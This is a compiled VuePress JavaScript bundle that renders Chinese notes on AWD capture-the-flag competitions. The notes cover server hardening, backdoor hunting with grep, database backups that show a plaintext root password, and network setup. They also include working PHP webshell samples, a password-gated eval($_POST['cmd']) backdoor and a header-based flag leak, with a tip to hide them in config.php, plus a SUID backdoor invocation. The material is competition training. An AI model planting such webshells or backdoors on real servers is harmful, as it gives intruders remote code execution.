(window.webpackJsonp=window.webpackJsonp||[]).push([[32],{655:function(a,t,s){"use strict";s.r(t);var e=s(4),n=Object(e.a)({},(function(){var a=this,t=a.$createElement,s=a._self._c||t;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"awd"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#awd"}},[a._v("#")]),a._v(" AWD")]),a._v(" "),s("h2",{attrs:{id:"加固信息"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#加固信息"}},[a._v("#")]),a._v(" 加固信息")]),a._v(" "),s("p",[a._v("后台 /iadmin 修改逻辑结构 iadmin/login.php 修改验证为false\nchmod -x a\nchmod -R 644 www")]),a._v(" "),s("p",[a._v("检查webshell.php\n检查连接 netstat -an | grep ESTABLISHED\n实时查看日志　tail -f logs/access_log &\ncopy别人的马到tmp/muma\n覆盖同名的 webshell.php")]),a._v(" "),s("h2",{attrs:{id:"suid后门"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#suid后门"}},[a._v("#")]),a._v(" suid后门")]),a._v(" "),s("p",[a._v("根目录下有.suid ，suid在运行时会有高级权限\n./.suid -p")]),a._v(" "),s("h2",{attrs:{id:"mysql-备份"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#mysql-备份"}},[a._v("#")]),a._v(" mysql 备份")]),a._v(" "),s("p",[a._v("mysqldump -uroot -phimaliya  --database choose test > tmp.sql\n/bin/mysql -uroot -phimaliya  test tmp.sql")]),a._v(" "),s("h2",{attrs:{id:"简单的查找后门"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#简单的查找后门"}},[a._v("#")]),a._v(" 简单的查找后门")]),a._v(" "),s("p",[a._v("find . -name '"),s("em",[a._v(".php' | xargs grep -n 'eval('\nfind . -name '")]),a._v(".php' | xargs grep -n 'assert('\nfind . -name '*.php' | xargs grep -n 'system(")]),a._v(" "),s("h2",{attrs:{id:"webshell-加密码"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#webshell-加密码"}},[a._v("#")]),a._v(" webshell 加密码")]),a._v(" "),s("p",[a._v("素质低的人则会放置一个md5马，比如\n<?php\nif(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a82\n5253')\n@ eval($_POST['cmd']);\n?>")]),a._v(" "),s("p",[a._v("如果素质低的人又很猥琐，像rootrain这种就是。那就是利用\nheader，最后综合起来就是\n<?php\necho 'hello';\nif(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253')\nif (@$_SERVER['HTTP_USER_AGENT'] == 'flag'){\n$test= 'flagxxxxxxxxxxxxxxxxxxxxxx';\nheader( \"flag:$test\");\n}\n?>\n放进config.php效果最好，因为一般很少人去看这个")]),a._v(" "),s("p",[a._v("脚本.zip\n上传phpwebshell.py")]),a._v(" "),s("h2",{attrs:{id:"最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#最后"}},[a._v("#")]),a._v(" 最后")]),a._v(" "),s("p",[a._v("修复后进行更新/重启。\n分工策略。\n复习：中间件加固。")]),a._v(" "),s("h1",{attrs:{id:"常用命令"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#常用命令"}},[a._v("#")]),a._v(" 常用命令")]),a._v(" "),s("p",[a._v("修改密码： passwd 用户名")]),a._v(" "),s("h1",{attrs:{id:"网卡配置"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网卡配置"}},[a._v("#")]),a._v(" 网卡配置")]),a._v(" "),s("p",[a._v("ip a\ncd /etc/sysconfig/network-scripts\nls 查看以太网的配置文件名是否和以太网卡名字相同\n不同则修改为同名\nvim ifcfg-以太网卡名\n修改配置文件中的以太网卡名\nservice network restart")]),a._v(" "),s("p",[a._v("启动apache /opt/lampp/lampp startapache")]),a._v(" "),s("h1",{attrs:{id:"todo"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#todo"}},[a._v("#")]),a._v(" TODO")]),a._v(" "),s("p",[a._v("xshell jump to current path on explorer\nsqlmap test\nsh 暴破登录,  hydra test\n？查看 linux下user\nawd.png\nmysql 搜索flag\n挂载到笔记本磁盘---help\n靶机练习\nhttps://blog.csdn.net/yetaodiao/article/details/80900133")]),a._v(" "),s("h2",{attrs:{id:"加固过程"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#加固过程"}},[a._v("#")]),a._v(" 加固过程")]),a._v(" "),s("p",[a._v("aclawl配置白名单")])])}),[],!1,null,null,null);t.default=n.exports}}]);